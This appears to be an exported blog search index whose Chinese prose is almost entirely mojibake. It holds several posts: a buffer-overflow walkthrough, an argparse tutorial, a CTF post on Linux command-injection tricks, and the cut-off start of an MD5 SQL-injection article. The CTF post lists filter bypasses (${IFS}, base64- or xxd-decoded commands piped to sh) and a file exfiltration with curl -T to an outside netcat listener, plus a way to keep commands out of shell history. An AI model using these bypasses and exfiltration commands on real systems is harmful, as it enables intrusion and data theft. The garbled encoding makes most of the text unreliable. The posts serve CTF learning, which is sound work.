åœ¨ä¸Šå›¾ä¸­ï¼Œæ¯”è¾ƒé‡è¦çš„æ˜¯æœ€åä¸¤è¡Œã€‚å…¶ä¸­æœ€åä¸€è¡Œåœ¨ä¹‹å‰å·²ç»è¯´è¿‡äº†ï¼Œæ˜¯éå¸¸é‡è¦çš„è¿”å›åœ°å€ï¼Œå®ƒå†³å®šäº†å½“mainå‡½æ•°æ‰§è¡Œå®Œæ¯•åï¼Œç¨‹åºæ‰€è¦æ‰§è¡Œçš„è¯­å¥çš„åœ°å€ï¼Œè€Œå€’æ•°ç¬¬äºŒè¡Œæ˜¯çˆ¶å‡½æ•°çš„EBP ã€‚ å†å¾€ä¸Šï¼Œå°±æ˜¯æˆ‘ä»¬çš„mainå‡½æ•°çš„å±€éƒ¨å˜é‡ç©ºé—´ã€‚è¿™é‡Œå¤§å®¶å¯èƒ½ä¼šæœ‰ç–‘æƒ‘ï¼Œæ—¢ç„¶æ˜¯åˆ†é…ç»™æˆ‘ä»¬çš„ç©ºé—´ï¼Œé‚£ä¹ˆä¸ºä»€ä¹ˆè¿˜ä¼šæœ‰å…¶å®ƒçš„æ•°æ®å‘¢ï¼Ÿ æˆ‘ä»¬ç»§ç»­å¾€ä¸‹æ‰§è¡Œ ,å½“æˆ‘ä»¬æ‰§è¡Œå®Œ0x401026 0X4Cçš„ç©ºé—´å¤§å°(7C - 34), è¿™æ®µç©ºé—´éƒ½è¢«0xCCå¡«å……äº†ã€‚è¿™æ˜¯å› ä¸ºç¨‹åºä¸ºäº†å®¹é”™æ€§ä¸ä¿æŒè‡ªèº«çš„å¥å£®æ€§ï¼Œäºæ˜¯åˆ©ç”¨0xCCï¼Œå³int 3æ–­ç‚¹æ¥å¡«å……æ»¡è¿™æ®µåŒºåŸŸï¼Œè¿™æ ·ä¸€æ¥ï¼Œå¦‚æœæœ‰æœªçŸ¥çš„ç¨‹åºè·³åˆ°è¿™ç‰‡åŒºåŸŸï¼Œå°±ä¸ä¼šå‡ºç°å´©æºƒçš„æƒ…å†µï¼Œè€Œæ˜¯ç›´æ¥æ–­ä¸‹æ¥äº†ã€‚å½“ç„¶ï¼Œè¿™ä¸ªé—®é¢˜ä¸æˆ‘ä»¬çš„ç¼“å†²åŒºæº¢å‡ºæ²¡ä»€ä¹ˆå…³ç³»ã€‚ ç»§ç»­æ‰§è¡Œï¼š è¿™é‡Œå°†betaoå…¥æ ˆäº†ï¼Œè¯´æ˜æ‰§è¡Œåˆ°äº†strcpy()ï¼Œè¿™ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬é€šè¿‡IDAæ¥æŸ¥çœ‹ä¸€ä¸‹ï¼Œstrcpy()å‡½æ•°çš„ä½ç½® ç»§ç»­æ‰§è¡Œï¼ŒæŸ¥çœ‹å †æ ˆä¸­çš„æƒ…å†µ å‘ç°strcpyå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œä¹Ÿå°±æ˜¯æ¥æ”¶å­—ç¬¦ä¸²æ‰€ä¿å­˜çš„ä½ç½®ï¼Œå…¶ä¿å­˜çš„ä½ç½®ä¸º0X0012FF78(bufferå˜é‡) åˆ°è¿™é‡Œç¨‹åºæ— å¼‚å¸¸ï¼Œæ­£å¸¸æ‰§è¡Œï¼Œç»§ç»­F8ï¼Œç›´è‡³retn è¿™ä¸ªåœ°å€æ˜¯ä¸æ˜¯å¾ˆç†Ÿæ‚‰å‘¢ï¼Ÿæ²¡é”™å°±æ˜¯è¿”å›åœ°å€ å¯¹æº¢å‡ºç¨‹åºåˆ†æå…¶ä½™è·Ÿä¸Šé¢æ­¥éª¤ç±»ä¼¼ï¼Œæˆ‘ä»¬ç›´æ¥è·³è‡³æ‰§è¡Œstrcpyå‡½æ•°çš„å†…å­˜åœ°å€åˆ†æ ç»§ç»­æ‰§è¡Œï¼Œæ‰§è¡Œè‡³retn,æŸ¥çœ‹å †æ ˆæ­¤æ—¶çš„æƒ…å†µ: æˆ‘ä»¬å³é”®æ˜¾ç¤ºä¸€ä¸‹asciiç ï¼š ç”±ä¸Šå›¾å¯çŸ¥ï¼š åŸæœ¬è¿”å›å€¼ï¼š0x00401699åœ°å€è¢«å ç”¨ ä¸”æŒ‡å‘é”™è¯¯çš„åœ°å€ï¼ˆæˆ–ä¸åº”è¯¥çš„åœ°å€ï¼‰ F8æ‰§è¡Œï¼Œç»“æœå¦‚å›¾ æ­¤æ—¶æˆ‘ä»¬å‘ç°äº†ä¸¤ä»¶äº‹ï¼Œä¸€ä»¶æ˜¯ODä¸­çš„åæ±‡ç¼–ä»£ç çª—å£æ˜¯ç©ºçš„ï¼Œè¯´æ˜0x006F6174åœ°å€å¤„ä¸å­˜åœ¨æŒ‡ä»¤ï¼Œæˆ–è€…è¯´å®ƒå°±æ˜¯ä¸€ä¸ªæ— æ•ˆåœ°å€ã€‚ç¬¬äºŒä»¶äº‹æ˜¯ODå¼¹å‡ºäº†é”™è¯¯å¯¹è¯æ¡†ï¼Œæç¤ºæˆ‘ä»¬è¯¥åœ°å€å‡ºé”™ï¼Œè¿™ä¸æˆ‘ä»¬ç›´æ¥æ‰§è¡Œç¨‹åºæ—¶æ‰€å¼¹å‡ºçš„é”™è¯¯å¯¹è¯æ¡†æœ‰å‡ åˆ†ç±»ä¼¼ã€‚ è¿™é‡Œå…ˆè¡¥å……ä¸€ä¸‹ï¼Œä¸ºä»€ä¹ˆè¿”å›åœ°å€æ˜¾ç¤ºçš„æ˜¯tao,è€Œä¸æ˜¯aobï¼Œå› ä¸ºbuffer ç©ºé—´åªæœ‰8ä¸ªå­—èŠ‚ï¼Œè€Œæˆ‘è¾“å…¥äº†15ä¸ªå­—èŠ‚ï¼Œbufferåé¢çš„å››ä¸ªå­—èŠ‚æ˜¯ebpçš„åœ°å€. 12betaobet aobe taoæ‹·è´å­—ç¬¦ EBP è¦†ç›–å†…å®¹ è¡¥å……ï¼šæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡æ‰§è¡Œtest2.exeç¨‹åº æ€»ç»“ï¼šç¼“å†²åŒºæ¼æ´çš„åŸç†ï¼Œå®ƒå°±æ˜¯å› ä¸ºæˆ‘ä»¬è¾“å…¥äº†è¿‡é•¿çš„å­—ç¬¦ï¼Œè€Œç¼“å†²åŒºæœ¬èº«åˆæ²¡æœ‰æœ‰æ•ˆçš„éªŒè¯æœºåˆ¶ï¼Œå¯¼è‡´è¿‡é•¿çš„å­—ç¬¦å°†è¿”å›åœ°å€è¦†ç›–æ‰äº†ï¼Œå½“æˆ‘ä»¬çš„å‡½æ•°éœ€è¦è¿”å›çš„æ—¶å€™ï¼Œç”±äºæ­¤æ—¶çš„è¿”å›åœ°å€æ˜¯ä¸€ä¸ªæ— æ•ˆåœ°å€ï¼Œå› æ­¤å¯¼è‡´ç¨‹åºå‡ºé”™ã€‚ é‚£ä¹ˆä¾æ®è¿™ä¸ªåŸç†ï¼Œå‡è®¾æˆ‘ä»¬æ‰€è¦†ç›–çš„è¿”å›åœ°å€æ˜¯ä¸€ä¸ªæœ‰æ•ˆåœ°å€ï¼Œè€Œåœ¨è¯¥åœ°å€å¤„åˆåŒ…å«ç€æœ‰æ•ˆçš„æŒ‡ä»¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„ç³»ç»Ÿå°±ä¼šæ¯«ä¸çŠ¹è±«åœ°è·³åˆ°è¯¥åœ°å€å¤„å»æ‰§è¡ŒæŒ‡ä»¤ã€‚å› æ­¤ï¼Œå¦‚æœæƒ³åˆ©ç”¨ç¼“å†²åŒºæº¢å‡ºçš„æ¼æ´ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ„é€ å‡ºä¸€ä¸ªæœ‰æ•ˆåœ°å€å‡ºæ¥ï¼Œç„¶åå°†æˆ‘ä»¬æƒ³è®©è®¡ç®—æœºæ‰§è¡Œçš„ä»£ç å†™å…¥è¯¥åœ°å€ï¼Œè¿™æ ·ä¸€æ¥ï¼Œæˆ‘ä»¬å°±é€šè¿‡ç¨‹åºçš„æ¼æ´ï¼Œè®©è®¡ç®—æœºæ‰§è¡Œäº†æˆ‘ä»¬è‡ªå·±ç¼–å†™çš„ç¨‹åºã€‚ æœ¬æ–‡ä¾‹å­å‚è€ƒæ¥æºï¼š https://blog.csdn.net/ioio_jy/article/details/48316029","categories":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://bobtaoy.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"æº¢å‡ºæ”»å‡»","slug":"æº¢å‡ºæ”»å‡»","permalink":"https://bobtaoy.github.io/tags/%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/"}]},{"title":"Python3--argparseæ¨¡å—ç®€è¦ä½¿ç”¨","slug":"Python3-argparseæ¨¡å—ç®€è¦ä½¿ç”¨","date":"2020-10-04T01:27:05.000Z","updated":"2020-10-04T01:27:40.819Z","comments":true,"path":"2020/10/04/Python3-argparseæ¨¡å—ç®€è¦ä½¿ç”¨/","link":"","permalink":"https://bobtaoy.github.io/2020/10/04/Python3-argparse%E6%A8%A1%E5%9D%97%E7%AE%80%E8%A6%81%E4%BD%BF%E7%94%A8/","excerpt":"","text":"å‰è¨€Python3ä¸­çš„argparseæ¨¡å—ï¼Œæ˜¯ç”¨æ¥åšå‘½ä»¤è¡Œå‚æ•°è§£æçš„ï¼Œå› ä¸ºoptparseæ¨¡å—å·²ç»ä¸å†æ›´æ–°ï¼Œæ‰€ä»¥ç‰¹æ­¤æ¥ä¸ºargparseçš„ä½¿ç”¨åšä¸ªç¬”è®° å®˜ç½‘æ˜¯è¿™æ ·è¯´æ˜çš„ï¼š 3.2ç‰ˆåå·²å¯ç§»é™¤ï¼šè¯¥optparseæ¨¡å—å·²å¼ƒç”¨ï¼Œå°†ä¸å†è¿›è¡Œå¼€å‘ï¼›è¯¥argparseæ¨¡å—å°†ç»§ç»­å¼€å‘ optparseå®˜æ–¹è¯´æ˜åœ°å€ï¼š https://docs.python.org/zh-cn/3.7/library/optparse.html è¿™ä¸ªæ¨¡å—çš„åŸºæœ¬ä½¿ç”¨æ­¥éª¤è·Ÿoptparseå·®åˆ«ä¸å¤§ï¼Œä½¿ç”¨æ­¥éª¤å¦‚ä¸‹: 12345import argparse # å¯¼å…¥æ¨¡å—parser &#x3D; argparse.ArgumentParser() # åˆ›å»ºä¸€ä¸ªè§£æå¯¹è±¡parser.add_argument() # æ·»åŠ å‚æ•°parser.parse_args() # è§£æ **argparse.ArgumentParse()**æ–¹æ³•æœ‰å¾ˆå¤šå‚æ•°ï¼Œä½†æ˜¯æœ€å¸¸ç”¨çš„å°±æ˜¯description, prog = None # ç¨‹åºåï¼Œé»˜è®¤ä¸ºsys.argv[0]ã€‚å¦å¤–ï¼Œå¦‚æœä½ éœ€è¦åœ¨helpä¸­ä½¿ç”¨åˆ°ç¨‹åºçš„åå­—ï¼Œå¯ä»¥ä½¿ç”¨%(prog)s description = None # helpæ—¶æ˜¾ç¤ºçš„å¼€å§‹æ–‡å­— epilog = None # helpæ—¶æ˜¾ç¤ºçš„ç»“å°¾æ–‡å­— prefix_chars=â€™-â€˜, - å‘½ä»¤çš„å‰ç¼€ï¼Œé»˜è®¤æ˜¯â€˜-â€™ add_help=True # æ˜¯å¦å¢åŠ -h/â€“helpé€‰é¡¹ï¼Œé»˜è®¤æ˜¯True) usageï¼š# æè¿°ç¨‹åºç”¨é€”çš„å­—ç¬¦ä¸² â€¦.. æ›´è¯¦ç»†çš„ä½¿ç”¨ï¼ŒæŸ¥çœ‹å®˜æ–¹æ–‡æ¡£ï¼š https://docs.python.org/zh-cn/3.7/library/argparse.html add_argument() æ–¹æ³•å’Œå‚æ•°ï¼Œæˆ‘ä»¬å®é™…ä½¿ç”¨æ¥ä»‹ç»: 12345678910111213# file-name:print_name.pyimport argparsedef main(): parser &#x3D; argparse.ArgumentParser(description&#x3D;&#39;Dome of argparse &#39;) parser.add_argument(&#39;--name&#39;, &#39;-n&#39;, default&#x3D;&#39;Tao&#39;) return parserif __name__ &#x3D;&#x3D; &#39;__main__&#39;: parser &#x3D; main() args &#x3D; parser.parse_args() name &#x3D; args.name print(&#39;Hello &#123;0&#125;&#39;.format(name)) ä¸Šè¿°ä»£ç æ‰§è¡Œç»“æœï¼š 12$ python print_name.py --name dog# è¾“å‡ºï¼š Hello dog ä¸Šé¢çš„ä»£ç ä¸­ï¼Œæˆ‘ä»¬é¦–å…ˆå¯¼å…¥äº†argparseæ¨¡å—ï¼Œç„¶åé€šè¿‡ argparser.ArgumentParserå‡½æ•°ç”Ÿæˆargparserå¯¹è±¡ ï¼Œå…¶ä¸­è¿™ä¸ªå‡½æ•°çš„descriptionå­—æ®µï¼Œè¡¨ç¤ºåœ¨å‘½ä»¤è¡Œæ˜¾ç¤ºçš„å¸®åŠ©ä¿¡æ¯æ—¶è¾“å‡ºè¿™ä¸ªç¨‹åºçš„æè¿°ä¿¡æ¯ï¼Œç„¶åæˆ‘ä»¬é€šè¿‡add_argumentå‡½æ•°æ¥å¢åŠ å‚æ•°ï¼Œè¿™é‡Œæˆ‘æ·»åŠ äº†ä¸¤ä¸ªå‚æ•°-nå’Œ--nameï¼Œå…¶ä¸­æœ‰ä¸ªé»˜è®¤å€¼å­—æ®µdefaultæ˜¯Taoã€‚ç„¶åæˆ‘ä»¬è¿™é‡Œå‘ç°ï¼ŒåŒä¸€ä¸ªå€¼çš„è®¾å®šå¯ä»¥è®¾ç½®å¤šä¸ªå‚æ•°ã€‚ è¿™é‡Œé»˜è®¤å€¼çš„æ„æ€æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬ä¸ä¼ è¿™ä¸ªå‚æ•°ï¼Œé‚£ä¹ˆè¿™ä¸ªå‚æ•°çš„å€¼é»˜è®¤å°±æ˜¯Tao 12$ python print_name.py# è¾“å‡ºï¼š Hello Tao æœ€åæˆ‘ä»¬é€šè¿‡argpaserå¯¹è±¡çš„parser_argså‡½æ•°æ¥è·å–æ‰€æœ‰å‚æ•°argsï¼Œç„¶åé€šè¿‡args.nameçš„æ–¹å¼å¾—åˆ°æˆ‘ä»¬è®¾ç½®çš„-nameå‚æ•°çš„å€¼ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œargparseé»˜è®¤çš„å‚æ•°åå°±æ˜¯--nameå½¢å¼é‡Œé¢--åé¢çš„å­—ç¬¦ä¸² ã€‚ ä¸€ . default ï¼šæ²¡æœ‰è®¾ç½®å€¼æƒ…å†µä¸‹çš„é»˜è®¤å‚æ•° äºŒ . required ï¼šè¡¨ç¤ºè¿™ä¸ªå‚æ•°æ˜¯å¦ä¸€å®šéœ€è¦è®¾ç½® å¦‚æœè®¾ç½®äº†required=True,ç„¶åˆ™åœ¨å®é™…çš„è¿ç”¨ä¸­ä¸è®¾ç½®è¯¥å‚æ•°ï¼Œé‚£ä¹ˆåˆ™ä¼šæŠ¥é”™ï¼Œ 1$ python print_name.py è¾“å‡ºå¦‚ä¸‹ä¿¡æ¯ 12usage: print_name.py [-h] --name NAMEprint_name.py: error: the following arguments are required: --name type æŒ‡å®šå‚æ•°ç±»å‹ï¼Œé»˜è®¤æ˜¯str, è¿˜æœ‰int,floatç­‰ å¦‚æœä½ çš„ç¨‹åºéœ€è¦æ•´æ•°è¿ç®—çš„è¯ï¼Œé‚£ä¹ˆéœ€è¦æŒ‡å®štype=int 123456789101112import argparsedef main(): parser = argparse.ArgumentParser(description=&#x27;Dome of argparse &#x27;) parser.add_argument(&#x27;--num&#x27;, type=int) return parserif __name__ == &#x27;__main__&#x27;: parser = main() args = parser.parse_args() sum = args.num print(1+sum) æ‰§è¡Œç»“æœ: 12python print_num.py --num 10# è¾“å‡ºï¼š11 æ²¡æœ‰æŒ‡å®šçš„è¯ï¼Œåˆ™ä¼šæŠ¥é”™ 12345python print_num.py --num 10Traceback (most recent call last): File &quot;print_num.py&quot;, line 13, in &lt;module&gt; print(1+sum)TypeError: unsupported operand type(s) for +: &#x27;int&#x27; and &#x27;str&#x27; dest è®¾ç½®å‚æ•°åœ¨ä»£ç ä¸­çš„å˜é‡å argparseé»˜è®¤çš„å˜é‡åæ˜¯--æˆ–-åé¢çš„å­—ç¬¦ä¸²ï¼Œä½†æ˜¯ä½ ä¹Ÿå¯ä»¥é€šè¿‡dest=xxxæ¥è®¾ç½®å‚æ•°çš„å˜é‡åï¼Œç„¶ååœ¨ä»£ç ä¸­ç”¨args.xxxæ¥è·å–å‚æ•°çš„å€¼ choices å‚æ•°å€¼åªèƒ½ä»å‡ ä¸ªé€‰é¡¹é‡Œé¢é€‰æ‹© help æŒ‡å®šå‚æ•°çš„è¯´æ˜ä¿¡æ¯ å‘Šè¯‰åˆ«äººè¿™ä¸ªå‚æ•°æœ‰å•¥ä½œç”¨ é€šè¿‡ä»£ç æ¥è§£é‡Šä¸€ä¸‹ï¼š 12345678910111213141516import argparsedef choices(): parser = argparse.ArgumentParser(description=&#x27;Choices Dome&#x27;) parser.add_argument(&#x27;-c&#x27;, dest=&#x27;choice&#x27;, required=True, choices=[&#x27;Tao&#x27;,&#x27;xiaoming&#x27;], help=&#x27;Choose a person you love&#x27;) return parserdef main(): parser = choices() args = parser.parse_args() choice = args.choice print(&#x27;You choices is &#123;0&#125;&#x27;.format(choice))iif __name__ == &#x27;__main__&#x27;: main() å¸®åŠ©ä¿¡æ¯çš„è¾“å‡ºï¼š 123456789$ python print_choices.py -husage: print_choices.py [-h] -c &#123;Tao,xiaoming&#125;Choices Domeoptional arguments: -h, --help show this help message and exit -c &#123;Tao,xiaoming&#125; Choose a person you love # åœ¨è¿™é‡Œï¼ï¼ï¼ é€‰æ‹©ä¸€ä¸ªå‚æ•°ï¼Œç»“æœæ‰§è¡Œå¦‚ä¸‹ï¼š 12$ python print_choices.py -c Tao# è¾“å‡ºç»“æœï¼š You choices is Tao nargs å‘½ä»¤è¡Œå‚æ•°çš„ä¸ªæ•°ï¼ŒæŒ‡å®šè¿™ä¸ªå‚æ•°åé¢çš„valueæœ‰å¤šå°‘ä¸ªï¼Œé»˜è®¤ä¸º1. 12345å€¼ å«ä¹‰N å‚æ•°çš„ç»å¯¹ä¸ªæ•°ï¼ˆä¾‹å¦‚ï¼š3ï¼‰&#x27;?&#x27; 0æˆ–1ä¸ªå‚æ•°&#x27;*&#x27; 0æˆ–æ‰€æœ‰å‚æ•°&#x27;+&#x27; æ‰€æœ‰ï¼Œå¹¶ä¸”è‡³å°‘ä¸€ä¸ªå‚æ•° ä»£ç å®ç°ï¼š 12345678910111213import argparsedef get_parser(): parser = argparse.ArgumentParser(description=&#x27;nargs Dome&#x27;) parser.add_argument(&#x27;-n&#x27;, dest=&#x27;name&#x27; ,required=True, type=str, nargs=&#x27;+&#x27;) return parserif __name__ == &#x27;__main__&#x27;: parser = get_parser() args = parser.parse_args() names = &#x27;, &#x27;.join(args.name) print(&#x27;Hello %s&#x27; % names) ä½¿ç”¨å¦‚ä¸‹ï¼š 12$ python print_name.py -n Tao xiaomingHello Tao, xiaoming å…³äºadd_argumentè¯¦ç»†å‚æ•°ä½¿ç”¨å¦‚ä¸‹ï¼š 1234567891011121314ArgumentParser.add_argument(name or flags...[, action][, nargs][, const][, default][, type][, choices][, required][, help][, metavar][, dest])å®šä¹‰åº”è¯¥å¦‚ä½•è§£æä¸€ä¸ªå‘½ä»¤è¡Œå‚æ•°ã€‚ä¸‹é¢æ¯ä¸ªå‚æ•°æœ‰å®ƒä»¬è‡ªå·±è¯¦ç»†çš„æè¿°ï¼Œç®€å•åœ°è®²å®ƒä»¬æ˜¯ï¼šname or flags - é€‰é¡¹å­—ç¬¦ä¸²çš„åå­—æˆ–è€…åˆ—è¡¨ï¼Œä¾‹å¦‚foo æˆ–è€…-f, --fooã€‚action - åœ¨å‘½ä»¤è¡Œé‡åˆ°è¯¥å‚æ•°æ—¶é‡‡å–çš„åŸºæœ¬åŠ¨ä½œç±»å‹ã€‚nargs - åº”è¯¥è¯»å–çš„å‘½ä»¤è¡Œå‚æ•°æ•°ç›®ã€‚const - æŸäº›actionå’Œnargsé€‰é¡¹è¦æ±‚çš„å¸¸æ•°å€¼ã€‚default - å¦‚æœå‘½ä»¤è¡Œä¸­æ²¡æœ‰å‡ºç°è¯¥å‚æ•°æ—¶çš„é»˜è®¤å€¼ã€‚type - å‘½ä»¤è¡Œå‚æ•°åº”è¯¥è¢«è½¬æ¢æˆçš„ç±»å‹ã€‚choices - å‚æ•°å¯å…è®¸çš„å€¼çš„ä¸€ä¸ªå®¹å™¨ã€‚required - è¯¥å‘½ä»¤è¡Œé€‰é¡¹æ˜¯å¦å¯ä»¥çœç•¥ï¼ˆåªé’ˆå¯¹å¯é€‰å‚æ•°ï¼‰ã€‚help - å‚æ•°çš„ç®€çŸ­æè¿°ã€‚metavar - å‚æ•°åœ¨å¸®åŠ©ä¿¡æ¯ä¸­çš„åå­—ã€‚dest - ç»™parse_args()è¿”å›çš„å¯¹è±¡è¦æ·»åŠ çš„å±æ€§åç§°ã€‚ å‚è€ƒæ–‡ç« ï¼š https://www.cnblogs.com/piperck/p/8446580.html http://vra.github.io/2017/12/02/argparse-usage/ https://docs.python.org/zh-cn/3.7/library/argparse.html","categories":[{"name":"Python","slug":"Python","permalink":"https://bobtaoy.github.io/categories/Python/"}],"tags":[{"name":"Pythonå¸¸ç”¨æ¨¡å—","slug":"Pythonå¸¸ç”¨æ¨¡å—","permalink":"https://bobtaoy.github.io/tags/Python%E5%B8%B8%E7%94%A8%E6%A8%A1%E5%9D%97/"}]},{"title":"Linuxåœ¨CTFä¸­çš„ä¸€äº›å°æŠ€å·§","slug":"Linuxåœ¨CTFä¸­çš„ä¸€äº›å°æŠ€å·§","date":"2020-10-04T01:24:32.000Z","updated":"2020-10-28T07:28:08.877Z","comments":true,"path":"2020/10/04/Linuxåœ¨CTFä¸­çš„ä¸€äº›å°æŠ€å·§/","link":"","permalink":"https://bobtaoy.github.io/2020/10/04/Linux%E5%9C%A8CTF%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/","excerpt":"","text":"CTFä¸­å„ç§èŠ±é‡Œèƒ¡å“¨çš„æ“ä½œè¿˜æ˜¯æŒºå¤šçš„ï¼Œè¿™é‡Œå‚è€ƒå¤§ä½¬çš„æ–‡ç« ï¼Œåšäº†æ›´è¯¦ç»†çš„æ€»ç»“ï¼ åœºæ™¯ä¸€ï¼šé™åˆ¶ç©ºæ ¼ å‡å¦‚éœ€è¦å®ç° cat flag.txt å‘½ä»¤è¯»å–flagï¼š åˆ©ç”¨&lt;&gt;é‡å®šå‘ç¬¦ï¼š åˆ©ç”¨${IFS}å˜é‡(å†…éƒ¨åŸŸåˆ†éš”ç¬¦)ï¼š åˆ©ç”¨{,}æ¥ä»£æ›¿ï¼š åˆ©ç”¨$IFS$9: åœºæ™¯äºŒï¼šä¸å…è®¸æŒ‡å®šå‘½ä»¤æ‰§è¡Œ å‡å¦‚éœ€è¦æ‰§è¡Œ uname å‘½ä»¤ï¼Œä½†è¿‡æ»¤æ‰äº† uname å­—ç¬¦ï¼š åˆ©ç”¨å‚æ•°æ‹¼æ¥ï¼ˆé»‘åå•ç»•è¿‡ï¼‰ï¼š åˆ©ç”¨â€™ â€œ å•ã€åŒå¼•å·ï¼ˆç¢°åˆ° escapeshellcmd() æ—¶æœ‰æ•ˆbypassï¼‰ï¼š å•ã€åŒå¼•å·æˆå¯¹å‡ºç°ä¸è¿‡æ»¤ï¼Œè¡¨ç¤ºç©ºå­—ç¬¦ä¸²ï¼› åˆ©ç”¨ ` å°å¼•å·ï¼Œå°±æ˜¯Tabä¸Šé‚£ä¸ªå¼•å·ï¼š å¦‚æœä¸€ä¸²å‘½ä»¤ä¸­å­˜åœ¨``ï¼Œä¼šå…ˆæ‰§è¡Œå¼•å·å†…çš„å‘½ä»¤ï¼› è¿™ä¹Ÿå°±æ˜¯åˆ©ç”¨DNSä¼ æ•°æ®çš„åˆ©ç”¨ç‚¹ï¼› åˆ©ç”¨è½¬ä¹‰ç¬¦å·\\åæ–œæ æ¥ç»•è¿‡ åœºæ™¯ä¸‰ï¼šä¸€æ¬¡æ‰§è¡Œå¤šæ¡å‘½ä»¤å‡å¦‚éœ€è¦æ‰§è¡Œunameå’Œidå‘½ä»¤ï¼š åˆ©ç”¨shellè„šæœ¬ç»“æŸç¬¦; åˆ†å·ï¼š åˆ©ç”¨é€»è¾‘ç¬¦å·(&amp;,&amp;&amp;,|,||) åœ¨Webé¡µé¢æ‰§è¡Œæ—¶å¯ä»¥åˆ©ç”¨å›è½¦çš„urlç¼–ç  %0a æ¥ç»•è¿‡ ç±»ä¼¼åœ¨shellè„šæœ¬ä¸‹æ”¾äº†ä¸¤æ¡å‘½ä»¤ å‘½ä»¤ç¼–ç ç»•è¿‡base64: 1234root@Tao:/tmp# printf &quot;whoami&quot; | base64d2hvYW1proot@Tao:/tmp# printf &quot;d2hvYW1p&quot; | base64 -d | shroot xxdï¼ˆ16è¿›åˆ¶ï¼‰ï¼š 1234root@Tao:/tmp# printf &quot;whoami&quot; | xxd -p77686f616d69root@Tao:/tmp# printf &quot;77686f616d69&quot; | xxd -r -p | shroot å­—ç¬¦æ›¿æ¢Linux 12345678910root@Tao:/tmp# echo $PATH/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binroot@Tao:/tmp# echo $&#123;PATH:5:1&#125;lroot@Tao:/tmp# echo $&#123;PATH:2:1&#125;sroot@Tao:/tmp# echo $&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125;lsroot@Tao:/tmp# $&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125;flag.txt tao.sh Linuxï¼š${PATH~: a :b} å…¶ä¸­aè¡¨ç¤ºä»aä½å¼€å§‹ï¼Œbè¡¨ç¤ºæˆªå–çš„é•¿åº¦ï¼› ï¼ˆä»0å¼€å§‹ï¼ï¼ï¼ï¼‰ å¦‚æœè¿‡æ»¤äº†å†’å·: 123456root@Tao:/tmp# echo $(expr substr $PATH 6 1)lroot@Tao:/tmp# echo $(expr substr $PATH 3 1)sroot@Tao:/tmp# $(expr substr $PATH 6 1)$(expr substr $PATH 3 1)flag.txt tao.sh Windows: 1234E:\\tmp&gt;echo %PATH%:~13,1C:\\Program Files (x86)\\....E:\\tmp&gt;echo %PATH:~14,1%e Windowsï¼š%PATH:~a,b% (ä»1å¼€å§‹æ•°) curl -T ä¸Šä¼ æ–‡ä»¶é¦–å…ˆï¼Œwindowsä¸»æœºç›‘å¬ç«¯å£ 1E:\\tmp&gt;nc.exe -l -v -p 2333 LinuxæœåŠ¡å™¨å‘é€æ–‡ä»¶ï¼š 1curl -T .&#x2F;flag.txt http:&#x2F;&#x2F;1.1.1.1:2333 é˜²æ­¢å‘½ä»¤è¢«è®°å½•åœ¨ç»ˆç«¯æ‰§è¡Œçš„æ¯ä¸€æ¡å‘½ä»¤éƒ½ä¼šè¢«è®°å½•åœ¨ history æ–‡ä»¶ä¸­ï¼Ÿ ä¸æ˜¯çš„ï¼Œå¦‚æœåœ¨å‘½ä»¤å‰åŠ ä¸ªç©ºæ ¼ï¼Œåˆ™ä¼šä¸è¢«è®°å½•ï¼› å¹¶ä¸”å‰åé‡å¤çš„å‘½ä»¤ä¸ä¼šè¢«è®°å½•ï¼› noteï¼š debainç³»å¯ä»¥ï¼Œcentosç³»ä¸è¡Œï¼› åˆ©ç”¨æ–‡ä»¶åæ‰§è¡Œå‘½ä»¤ *æ˜¯Linuxä¸‹çš„é€šé…ç¬¦ï¼Œå®ƒä¼šå°†ç¬¦åˆæ¨¡å¼çš„æ–‡ä»¶åˆ—å‡ºæ¥ï¼Œä¹‹åæ‰§è¡Œï¼› 1234567root@Tao:/tmp# lsroot@Tao:/tmp# touch bashroot@Tao:/tmp# echo id &gt;&gt; tao.bashroot@Tao:/tmp# lsbash tao.bashroot@Tao:/tmp# *uid=0(root) gid=0(root) ç¼ï¿½=0(root) å‚è€ƒæ–‡ç« : https://ai-sewell.me/2017/Some-tricks-of-Linux-in-CTF/","categories":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://bobtaoy.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://bobtaoy.github.io/tags/CTF/"}]},{"title":"MD5åŠ å¯†åçš„SQLæ³¨å…¥(éªšæ“ä½œ)","slug":"MD5åŠ å¯†åçš„SQLæ³¨å…¥-éªšæ“ä½œ","date":"2020-10-04T01:19:11.000Z","updated":"2020-10-28T07:26:42.620Z","comments":true,"path":"2020/10/04/MD5åŠ å¯†åçš„SQLæ³¨å…¥-éªšæ“ä½œ/","link":"","permalink":"https://bobtaoy.github.io/2020/10/04/MD5%E5%8A%A0%E5%AF%86%E5%90%8E%E7%9A%84SQL%E6%B3%A8%E5%85%A5-%E9%AA%9A%E6%93%8D%E4%BD%9C/","excerpt":"","text":"å‰è¨€äº‹æƒ…çš„èµ·å› æ˜¯,æˆ‘åœ¨çœ‹ä¸€ç¯‡å¤§ä½¬å†™çš„writeup,å…³äºsniperoj-webçš„è§£æï¼Œæˆ‘å‘ç°äº†ä¸€ä¸ªå…³äºMD5åŠ å¯†sqlæ³¨å…¥çš„éªšæ“ä½œï¼Œæˆ‘ä¾¿è‡ªå·±å¼€å§‹æ­ç¯å¢ƒï¼Œå‡†å¤‡å¤ç°ä¸€æ³¢ æˆ‘è¿™é‡Œåˆ©ç”¨çš„æ˜¯dvwaçš„è´¦å·å¯†ç çš„ç¯å¢ƒ 